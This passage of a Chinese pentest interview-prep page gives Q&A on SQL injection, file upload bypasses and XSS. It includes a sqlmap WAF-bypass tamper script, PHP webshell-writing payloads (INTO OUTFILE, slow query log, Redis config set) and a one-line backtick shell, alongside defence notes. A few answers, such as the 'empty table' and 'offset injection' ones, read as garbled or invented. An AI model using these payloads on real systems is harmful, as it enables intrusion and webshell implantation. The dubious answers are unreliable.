class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/*/!%!/*/&quot;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;()&quot;</span>,<span class="string">&quot;(/*/!%!/*/)&quot;</span>)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(INFORMATION_SCHEMA.SCHEMATA)&quot;</span>,<span class="string">r&quot;/*!00000--%20/*%/%0aINFORMATION_SCHEMA.SCHEMATA*/&quot;</span>,payload)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(INFORMATION_SCHEMA.TABLES)&quot;</span>,<span class="string">r&quot;/*!00000--%20/*%/%0aINFORMATION_SCHEMA.TABLES*/&quot;</span>,payload)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(INFORMATION_SCHEMA.COLUMNS)&quot;</span>,<span class="string">r&quot;/*!00000--%20/*%/%0aINFORMATION_SCHEMA.COLUMNS*/&quot;</span>,payload)</span><br><span class="line">        payload = re.sub(<span class="string">r&quot;(?i)(/AS/)&quot;</span>,<span class="string">r&quot;//*!00000--%20/*%/%0aAS*//&quot;</span>,payload)        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p><a href="https://www.secpulse.com/archives/196598.html">参考资料</a></p><ol start="22"><li>为什么参数化查询可以防止SQL注入？</li></ol><p>参数化查询是指在设计与数据库连接并访问数据时，在需要填入数值或数据的地方，使用参数（Parameter）来给值。<br>在使用参数化查询的情况下，数据库服务器不会将参数的内容视为SQL语句的一部分来进行处理，而是在数据库完成SQL语句的编译之后，才套用参数执行。因此就算参数中含有破坏性指令，也不会被数据库执行。<br><a href="https://worktile.com/kb/ask/35126.html">如何从根本上防止 SQL 注入</a></p><ol start="23"><li>盲注是什么？怎么盲注？</li></ol><p>在服务器没有错误回显的时候完成的注入攻击。盲注分为布尔盲注和时间盲注。<br>盲注可以通过手工，burp或sqlmap。<br>手工：首先判断注入点，然后判断当前页面字段数，再判断显示位，之后是猜解当前数据库名长度，用ASCII码猜解当前数据库名，最后猜表名猜字段名猜内容。</p><ol start="24"><li>宽字节注入原理以及根本原因</li></ol><p>原理：见问题4<br>根本原因：设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</p><ol start="25"><li>sql如何写shell&#x2F;单引被过滤怎么办？SQL注入写shell（MySQL &amp; mssql &amp; oracle）sql注入如何拿getshell？sql注入，写shell的语句，除了into outfile还有什么MySQL的特性可以getshell</li></ol><p>sql写shell的前提条件：<br>1 需要知道网站的绝对路径<br>2 secure_file_priv的值为空<br>3 需要足够的权限<br>4 GPC关闭可使用单引号</p><p>sql写shell的方式：<br>(1) 导出函数写shell</p><ul><li>into outfile直接写。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,&quot;&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;&quot; into outfile &quot;C:/phpstudy/WWW/shell.php&quot;#</span><br></pre></td></tr></table></figure></li><li>shell HEX编码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,0x3C3F70687020406576616C28245F504F53545B2763275D293B3F3E into outfile &quot;C:/phpStudy/WWW/shell.php&quot;#</span><br></pre></td></tr></table></figure></li></ul><p>(2) 日志写shell<br>① 开启慢查询日志并修改日志为网站路径下的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;; set global slow_query_log=1;set global slow_query_log_file=&#x27;C:/phpstudy/WWW/logshell.php&#x27;;#</span><br></pre></td></tr></table></figure><p>② 执行包含shell的查询语句并使用sleep(11)让语句记录进慢查询日志脚本。连接成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;;select &quot;&lt;?php eval($_POST[log]);?&gt;&quot; from users where sleep(11)#</span><br></pre></td></tr></table></figure><p>(3) 读文件函数写文件<br>① <code>load_file()</code><br>② <code>?id=-1&#39;union select 1,load_file(&#39;C:/phpstudy/WWW/readme.txt&#39;);#</code></p><p>单引号被过滤了怎么办？<br>16进制，ASCII编码，url编码，尝试用双引号或反斜杠代替</p><ol start="26"><li>sql注入点，空表如何利用</li></ol><p>攻击者可以利用空表绕过服务器的过滤。<br>空表攻击的原理：利用空表名作为参数，在查询语句中执行任意SQL语句。如: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `#` WHERE `id` = 1</span><br></pre></td></tr></table></figure><p>具体的防范措施：</p><ul><li>在参数中使用双引号而不是单引号，这样可以避免单引号被转义。</li><li>使用函数来处理参数，例如 trim()、rtrim() 和 ltrim() 等函数，可以帮助去除参数中的空格和其他特殊字符。</li><li>使用正则表达式来验证参数的格式，可以帮助检测和阻止恶意参数。</li></ul><ol start="27"><li>怎样判断是否存在注入</li></ol><p>手工测试，使用工具(sqlmap)，使用安全扫描(Nessus)<br>单引号检测，空格检测，特殊字符检测(; # *等)，逻辑运算符检测(and or等)</p><ol start="28"><li>sql注入无回显怎么办？</li></ol><p>通过dnslog或httplog外带</p><ol start="29"><li>延时注入除了sleep的其它姿势(mysql)</li></ol><p>benchmark()函数</p><ol start="30"><li>DNSlog原理</li></ol><p>DNSlog是DNS的日志，存储在DNS服务器上的域名信息，记录着用户对域名的访问信息，类似日志文件。<br>DNSlog是解析日志，DNS分为三级域名，域名不分大小写，所以利用解析的日志把攻击者需要的值带出，称为数据外带，原理上只要能进行DNS请求的函数都可能存在DNSlog注入。</p><ol start="31"><li>sql注入，写shell的语句，除了into outfile还有什么MySQL的特性可以getshell</li></ol><p>见问题25</p><ol start="32"><li>redis的利用，如何shell，相关命令</li></ol><p>写ssh-keygen公钥登录服务器，利用计划任务反弹shell<br>写shell见问题36</p><ol start="33"><li>sql注入原理，及常用payload（手写-爆表名）</li></ol><p>SQL注入是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><ol start="34"><li>sql注入空格不能使用如何绕过？</li></ol><p>使用括号绕过，使用 <code>tab %0a /**/</code> 代替</p><ol start="35"><li>sql注入防御，延伸预处理不能预防哪些注入？</li></ol><p>基于盲注的注入（盲注是指攻击者通过向数据库发送一系列的SQL语句来判断数据库中是否存在特定数据。攻击者可将参数值设置为特殊的字符串，例如%或_，以绕过数据库的参数化处理）<br>基于时间延迟的注入（基于时间延迟的注入是指攻击者通过向数据库发送一系列的SQL语句来延迟数据库的响应时间，以判断数据库中是否存在特定数据。在这种情况下，攻击者可以将参数值设置为会导致数据库执行大量计算的语句，以延迟数据库的响应时间。）<br>基于错误信息的注入（基于错误信息的注入是指攻击者通过向数据库发送一系列的SQL语句来获取数据库的错误信息，以判断数据库中是否存在特定数据。在这种情况下，攻击者可以将参数值设置为会导致数据库抛出异常的语句，以获取数据库的错误信息。）</p><ol start="36"><li>攻击redis的方式（手写payload）</li></ol><p>常见攻击redis的方式有：未授权访问、命令注入、缓存溢出、远程代码执行、数据泄露<br>payload示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip -p port    <span class="comment"># redis远程连接</span></span><br><span class="line">ip:port&gt; info              <span class="comment"># 列出信息</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html </span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php eval(<span class="variable">$_POST</span>[whoami]);?&gt;\r\n\r\n&quot;</span></span><br><span class="line"><span class="comment"># 用redis写入文件的会自带一些版本信息，如果不换行可能导致无法执行</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><ol start="37"><li>SQL注入写shell（MySQL &amp; mssql &amp; oracle）sql注入如何拿getshell</li></ol><p>见问题25<br><a href="http://www.kryst4l.cn/2022/09/05/Oracle%E5%92%8Cmssql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99shell/">Oracle和mssql数据库写shell</a></p><ol start="38"><li>SQL注入后利用</li></ol><p>获取数据库信息，修改数据库数据，删除数据库数据，执行任意操作</p><ol start="39"><li>redis的利用</li></ol><p>见问题32</p><ol start="40"><li>常见的sql注入类型有哪些？并写出sqlmap检测sql注入的命令？sqlmap api怎么使用？</li></ol><p>sql注入类型：联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入<br>sqlmap检测sql注入的命令：<br><code>python sqlmap.py -u http://xxx.xxx.xxx.xxx/abc/qwe/?id=1 --dbs --batch</code><br>sqlmap api使用方式：<br>首先在本地启动sqlmap服务器： <code>python sqlmapapi.py -s</code> 将在localhost端口8000运行。(服务端和客户端不在同一台主机上会连接不上)<br>通过该命令开启api服务端： <code>python sqlmapapi.py -s -H &quot;0.0.0.0&quot; -p 8775</code><br>命令成功后，远程客户端可通过指定远程主机IP和端口来连接API服务端</p><p>需要固定 admin token, 修改sqlmap目录下的 <code>/lib/utils/api.py</code> 文件，以下是源代码：<br><code>DataStore.admin_token = encodeHex(os.urandom(16), binary=False)</code></p><p>使用GET请求 <code>new -u &quot;http://192.168.1.1/dvwa/vulnerabilities/sqli/?id=2&amp;submit=Submit&quot;</code><br>创建一个新的扫描任务</p><p>使用POST请求 <code>new -r C:\Users\abc\sql\build1\test.txt</code><br>发送JSON数据到 <code>http://localhost:8000/scan/start</code><br>JSON数据的格式如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;parameters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;id&quot;</span><span class="punctuation">,</span> <span class="string">&quot;username&quot;</span><span class="punctuation">,</span> <span class="string">&quot;password&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// url 是目标URL，parameters是需要测试注入的参数。</span></span><br></pre></td></tr></table></figure><p>sqlmap将返回一个JSON数据，其中包含扫描结果，扫描结果的格式如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;running&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;taskid&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;results&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">// status表示扫描状态，taskid是任务id，results是扫描结果</span></span><br><span class="line"><span class="comment">// 扫描完成后，status将变成terminated, results将包含扫描结果</span></span><br></pre></td></tr></table></figure><p>可以通过以下命令获取任务状态(其中 1 是任务id)：<br><code>curl http://localhost:8000/scan/status/1</code><br>可通过以下命令获取所有任务id：<br><code>curl http://localhost:8000/scan/status/ids</code></p><p>基于HTTP协议的接口模式：<br><code>@get(&quot;/task/new&quot;)</code> 新建任务，返回一个随机的taskid<br><code>@get(&quot;/task//delete&quot;)</code> 删除任务，调用时指定taskid<br><code>@get(&quot;/admin/list&quot;)</code> 获取taskid</p><ol start="41"><li>针对sql注入，写出你所知道的bypass waf的可能方式</li></ol><p>见问题20</p><ol start="42"><li>sql注入漏洞如何修复？</li></ol><p>预处理。使用参数化查询。过滤用户输入。使用安全编码实践。配置MySQL临时日志查看SQL语句。</p><ol start="43"><li>数据库预处理怎么突破？SQL预处理绕过 数据库预处理绕过</li></ol><p>1、使用字符串拼接。攻击者可以将用户输入的数据作为字符串拼接到SQL语句中，从而绕过预编译的安全机制。<br>2、使用函数或存储过程。攻击者可以使用函数或存储过程来执行OS命令，从而绕过预编译的安全机制。<br>3、错误处理不当。攻击者可以构造恶意的输入来触发SQL语法错误，从而绕过预编译的安全机制。<br><a href="https://xz.aliyun.com/t/10594">SQL注入之Mysql注入姿势及绕过总结</a></p><ol start="44"><li>sql注入如何拿getshell</li></ol><p>见问题37</p><ol start="45"><li>sqlmap怎么跑post请求</li></ol><p>方式一：burp抓包，保存为txt格式文件，放在目录下。<br><code>python sqlmap.py -r &quot;dialog/xx.txt&quot; -p n --dbs</code></p><p>方式二：自动搜索表单的方式<br><code>python sqlmap.py -u &quot;http://example.com/index.php&quot; --forms</code></p><p>方式三：指定一个参数的方法<br><code>python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/index.php --data &quot;uname=1&amp;passwd=11&amp;submit=Submit&quot; --dbs --batch   爆破所有数据库</code></p><ol start="46"><li>sql注入怎么拿到最高权限？</li></ol><p>见问题37</p><ol start="47"><li>怎么利用sql注入来读取文件</li></ol><p>MySQL读文件:<br><code>load_file(&#39;c:/boot.ini&#39;)</code><br>sqlmap的方式：<br><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --file-read &quot;D:/test.txt&quot;</code><br>SQL Server 读文件: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">result</span>(res <span class="type">varchar</span>(<span class="number">8000</span>));</span><br><span class="line">bulk <span class="keyword">insert</span> <span class="keyword">result</span> <span class="keyword">from</span> <span class="string">&#x27;d:/1.txt&#x27;</span>; # BULK <span class="keyword">INSERT</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 开启CLR集成</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;clr_enabled&#x27;</span>,<span class="number">1</span></span><br><span class="line">reconfigure</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> master.dbo.fn_varbintohexstr(<span class="built_in">cast</span>(content <span class="keyword">as</span> <span class="type">varbinary</span>)) <span class="keyword">from</span> sys.assembly_files  # 读取方式</span><br><span class="line"><span class="keyword">create</span> assembly sqb <span class="keyword">from</span> <span class="string">&#x27;d:\net.exe&#x27;</span>;</span><br><span class="line"><span class="keyword">alter</span> assembly sqb <span class="keyword">add</span> file <span class="keyword">from</span> <span class="string">&#x27;d:\1.txt&#x27;</span></span><br><span class="line"><span class="keyword">alter</span> assembly sqb <span class="keyword">add</span> file <span class="keyword">from</span> <span class="string">&#x27;d:\notnet.exe&#x27;</span></span><br></pre></td></tr></table></figure><ol start="48"><li>注入攻击原理是什么？如何找注入点？如何判断注入点？</li></ol><p>注入攻击原理：见问题33<br>如何判断如何找注入点：见问题1，8，27</p><ol start="49"><li>注入分为几类，提交方式是什么？</li></ol><p>见问题2</p><ol start="50"><li>注入攻击一般所支持的类型有哪些？</li></ol><p>见问题49</p><ol start="51"><li>sql注入对服务器文件读写操作需要哪些条件？</li></ol><p>当前用户权限对该文件可读，<br>文件在服务器上，<br>路径完整，<br>文件按大小小于max_allowed_packet，<br>当前数据库用户有FILE权限，file_priv为yes，<br>secure_file_priv的值为空，如果值为某目录，那么就只能对该目录的文件进行操作。</p><ol start="52"><li>分别说出sqlmap -u -r -v -p  –level –risk –tables –columns -T –tamper参数的含义</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-u  URL，指定目标url</span><br><span class="line">-r  REQUESTFILE，从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，</span><br><span class="line">这样就可以跳过设置一些其它参数（比如cookie，post数据等），</span><br><span class="line">请求是HTTPS的时候需要配合这个--force-ssl参数来使用，或者可以在HOST头后门加上443</span><br><span class="line">-v  VERBOSE，信息级别：0-6。</span><br><span class="line">其值具体含义：“0”只显示python错误以及严重的信息；</span><br><span class="line">1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；</span><br><span class="line">“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；</span><br><span class="line">“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</span><br><span class="line">-p  TESTPARAMETER，可测试的参数</span><br><span class="line">--level  LEVEL，执行测试的等级（1-5，默认为1）</span><br><span class="line">--risk  RISK，执行测试的风险（0-3，默认为1）</span><br><span class="line">--tables  枚举DBMS数据库中的表</span><br><span class="line">--columns  枚举DBMS数据库中表的列名</span><br><span class="line">-T  指定数据库中的表</span><br><span class="line">--tamper  使用给定的脚本篡改注入数据</span><br></pre></td></tr></table></figure><ol start="53"><li>注入漏洞防范方法</li></ol><p>见问题2</p><ol start="54"><li>MySQL数据库的右向偏移</li></ol><p>偏移注入是一种利用MySQL中的字符串截断漏洞来获取敏感信息的攻击方式。<br>攻击者通过在注入语句中插入特殊字符，将字符串截断到指定位置，从而获取该位置的数据。</p><p>偏移注入的攻击原理如下：<br>攻击者首先通过猜测表名和字段名，构造一个SQL注入语句。<br>在注入语句中插入特殊字符，将字符串截断到指定位置。<br>通过查询数据库，获取截断位置的数据。</p><p>偏移注入的攻击方式主要有两种：<br>字符串截断：攻击者通过在注入语句中插入特殊字符，将字符串截断到指定位置。<br>字符编码：攻击者通过在注入语句中插入特殊字符，将字符编码成指定格式，从而获取该格式的数据。</p><p>偏移注入的防范措施主要有以下几点：<br>使用严格模式：MySQL的严格模式可以防止字符串截断漏洞，因此建议使用严格模式。<br>过滤特殊字符：在输入数据中过滤特殊字符，可以防止攻击者利用这些字符进行注入攻击。<br>使用安全的编码方式：使用安全的编码方式，可以防止攻击者利用编码漏洞进行注入攻击。</p><ol start="55"><li>sqlserver利用思路</li></ol><p>(1) 危险存储过程利用<br>(2) COM组件利用<br>(3) SQL server CLR利用<br>(4) SQL Server Agent Job代理执行计划任务利用<br>(5) SQL Server R和Python的利用<br><a href="https://xz.aliyun.com/t/10955">从0开始学习Microsoft SQL Server数据库攻防</a></p><ol start="56"><li>偏移注入</li></ol><p>见问题54</p><ol start="57"><li>说说sql注入手工怎么爆出所有库名字</li></ol><p>爆当前库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata</span></span><br></pre></td></tr></table></figure><p>爆所有库<br><code>show databases;</code><br><code>select * from information_schema.SCHEMATA</code><br><code>id=1&#39; union select 1,schema_name from information_schema.SCHEMATA</code></p><ol start="58"><li>数据库表名test，字段名user，password写出查询语句。</li></ol><p><code>?id=1&#39; union select group_concat(user,password) from test--+</code></p><ol start="59"><li>是否有写过tamper</li></ol><p>见问题21</p><ol start="60"><li>如何彻底杜绝SQL注入？</li></ol><p>见问题2</p><ol start="61"><li>SQL注入，如果注入点在union或order by之后，怎么办？</li></ol><p>使用堆叠注入？</p><ol start="62"><li><p>sqlmap原理<br>通过构造恶意的SQL查询语句，利用应用程序的漏洞来执行SQL注入攻击。<br>联合注入，报错注入，布尔盲注，时间盲注，堆叠注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-u  URL，指定目标url</span><br><span class="line">-r  REQUESTFILE，从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，</span><br><span class="line">这样就可以跳过设置一些其它参数（比如cookie，post数据等），</span><br><span class="line">请求是HTTPS的时候需要配合这个--force-ssl参数来使用，或者可以在HOST头后门加上443</span><br><span class="line">-v  VERBOSE，信息级别：0-6。</span><br><span class="line">其值具体含义：“0”只显示python错误以及严重的信息；</span><br><span class="line">1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；</span><br><span class="line">“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；</span><br><span class="line">“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</span><br><span class="line">-p  TESTPARAMETER，可测试的参数</span><br><span class="line">--level  LEVEL，执行测试的等级（1-5，默认为1）</span><br><span class="line">--risk  RISK，执行测试的风险（0-3，默认为1）</span><br><span class="line">--tables  枚举DBMS数据库中的表</span><br><span class="line">--columns  枚举DBMS数据库中表的列名</span><br><span class="line">-T  指定数据库中的表</span><br><span class="line">--tamper  使用给定的脚本篡改注入数据</span><br></pre></td></tr></table></figure></li><li><p>order by注入 limit注入 后面跟的函数有什么不同<br>limit注入只存在低于MySQL 5.5的版本中；<br>limit注入后跟的函数: <code>PROCEDURE ANALYSE</code><br>order by注入后跟的函数: <code>if</code></p></li><li><p>order by含义<br>order by是mysql中对查询数据进行排序的方法。默认升序(aes)，也可降序(desc)</p></li><li><p>过滤了单引号into outfile还能用吗？<br>不能，GPC要off才行，可以测试Hex编码</p></li></ol><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><ol><li>文件上传有哪些防护方式？</li></ol><p>(1) 文件上传目录设置为不可执行：最有效。Linux撤销’x’权限，放置在独立存储上作为静态文件。缓存加速，杜绝脚本执行。<br>(2) 判断文件类型：MIME Type、后缀检查等方式。类型检查用白名单。图片用压缩函数或resize函数。<br>(3) 用随机数改写文件名和文件路径：无法得知文件名和路径就难以攻击。类似于shell.php.rar和crossdomain.xml会因重命名而无法攻击。<br>(4) 单独设置文件服务器的域名：浏览器同源策略一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。<br>(5) 限制用户上传文件的类型：指定格式和后缀名，上传后对文件后缀名进行校验，防止攻击者双后缀名绕过。<br>(6) 使用安全的文件上传组件：比如WebUploader, plupload, FineUploader。</p><ol start="2"><li>文件上传白名单利用</li></ol><p>文件包含图片马，文件包含日志，包含SESSION，00截断，文件解析漏洞，.user.ini，.htaccess</p><ol start="3"><li>文件上传点，黑名单限制，如何利用</li></ol><p>上传不常见的PHP扩展名来绕过黑名单（pht, phpt, phtml, php3, php4, php5, php6）<br>文件名过滤时忽略了大小写（pHp,Php,phP）<br>解析漏洞（Apache和IIS解析漏洞）</p><ol start="4"><li>文件上传怎么绕过</li></ol><p>前端客户端过滤绕过：关闭JS脚本<br>基于黑名单的文件名过滤绕过：1. 上传不常见的PHP扩展名来绕过黑名单。 2. 文件名过滤忽略大小写 3. 解析漏洞<br>基于白名单的文件名过滤绕过：1. 空字节注入。 2. 双写扩展名  3. .user.ini  4. .htaccess<br>Content-Type过滤：使用burp截断修改content-type<br>文件头过滤：加上图片文件头<br>二次渲染：通过PHP GD库来创建一张含有木马的图片能绕过服务器的二次渲染<br>超短shell： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[x]`?&gt;</span><br></pre></td></tr></table></figure><ol start="5"><li>任意文件上传漏洞分几类，说出每类突破方法</li></ol><p>文件类型过滤漏洞：服务器端对文件上传的文件类型进行过滤，但过滤规则不严谨，导致攻击者可以上传恶意文件。例如：修改后缀绕过过滤。<br>文件名过滤漏洞：服务器端对上传的文件名进行过滤，但过滤规则不严谨，导致攻击者可以上传恶意文件。例如：攻击者在恶意脚本的文件名加入特殊字符，绕过过滤。<br>目录穿越漏洞：攻击者可以利用目录穿越漏洞，将恶意文件上传到服务器的敏感目录下。例如：将恶意脚本文件的文件名加入..&#x2F; ,从而将恶意脚本文件上传到上级目录下。<br>文件解析漏洞：服务器端在解析上传的文件时存在漏洞，导致攻击者可以利用该漏洞执行恶意代码。例如，服务器端在解析图片文件时存在漏洞，攻击者可以将恶意脚本文件嵌入到图片文件中，从而执行恶意代码。</p><ol start="6"><li>上传的木马被当成图片解析或不解析怎么办？<br>通过上传自定义文件.user.ini，使php去读取其内容，将指定文件包含在一个正常的php文件中，进行解析，从而达到getshell的结果。该方法用在文件上传，.user.ini可以上传成功，且在上传目录下存在一个正常的php文件即可。可以在php文件无法正常上传,不存在文件包含漏洞,图片马上传之后无法解析的情况下进行。</li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><ol><li>XSS能用来做什么？</li></ol><p>盗取各类用户账号<br>控制企业数据<br>盗窃企业重要资料<br>非法转账<br>强制发送电子邮件<br>网站挂马控制受害者及其向其它网站发起攻击<br>刷流量，执行弹窗广告</p><ol start="2"><li>XSS的三种类型，防御方法。</li></ol><p>反射型：非持久性，参数型跨站脚本。发出请求时，XSS代码出现在URL中，作为输入提交到服务器，服务器解析后响应，XSS代码随响应内容一同传回浏览器，最后浏览器执行代码。<br>存储型：持久性跨站脚本，可写入数据库或文件等永久保存的介质中。<br>DOM型：文档对象模型（Document Object Model）是接口，允许程序或脚本动态的访问和更新。DOM型XSS是特殊的反射型XSS，也被称为本地跨站，基于DOM文档对象模型的一种漏洞。不需要服务器参与，触发靠浏览器解析。</p><p>防御方法：XSS防御  XSS防范<br>输入过滤：过滤掉HTML标签，JS代码，特殊字符等。<br>输出编码：对输出到页面的数据进行编码，以使其无法被浏览器执行。如将HTML进行HTML编码，JS进行js编码<br>使用过滤器：使用专业的XSS过滤器来检测和过滤恶意代码。<br>使用安全的编码规范：不将URL中使用用户输入的数据，不将用户输入直接插入到HTML标签中等。<br>执行内容安全策略：CSP限制页面在特定时间内加载的资源来减轻XSS的影响。这些资源可以包括可能损害客户端和服务器的脚本和图像。</p><ol start="3"><li>存储型XSS的原理和危害</li></ol><p>存储型XSS的原理：攻击者将恶意代码注入到服务器端数据库中，当用户访问包含恶意代码的页面时，恶意代码会被执行。<br>危害：可以多次攻击不同用户，窃取用户的账号和密码等信息，钓鱼，控制用户浏览器，传播恶意软件。</p><ol start="4"><li>你怎么理解XSS攻击？</li></ol><p>XSS攻击是一种跨站脚本攻击，是指攻击者将恶意代码注入到 Web 应用程序中，当用户访问该应用程序时，恶意代码会被执行。XSS攻击的危害性较大，可以窃取用户信息、控制用户浏览器、传播恶意软件等。</p><p>XSS攻击分为两种类型：<br>反射型 XSS：攻击者将恶意代码注入到 URL 中，当用户访问该 URL 时，恶意代码会被执行。<br>存储型 XSS：攻击者将恶意代码注入到服务器端数据库中，当用户访问包含恶意代码的页面时，恶意代码会被执行。</p><p>XSS攻击的防范方法主要有：<br>过滤用户输入的数据：对用户输入的数据进行过滤，去除其中的恶意字符和代码。<br>编码输出的数据：对输出到页面的数据进行编码，以使其无法被浏览器执行。<br>使用白名单：只允许特定的字符和代码通过，从而防止恶意代码通过。<br>使用过滤器：使用专业的 XSS 过滤器来检测和过滤恶意代码。</p><ol start="5"><li>如何快速发现XSS位置</li></ol><p>检查用户可控输入：XSS攻击通常需要利用用户可控输入，例如用户名，密码，评论，留言等。因此可以检查这些输入是否经过过滤和编码，如果没有，则可能存在XSS注入。<br>检查HTML输出：XSS攻击可以通过HTML输出来执行。检查输出是否包含敏感字符和代码，如 <code>&lt;script&gt;, &lt;iframe&gt;, &lt;img&gt;</code> 等。<br>使用XSS扫描工具：<a 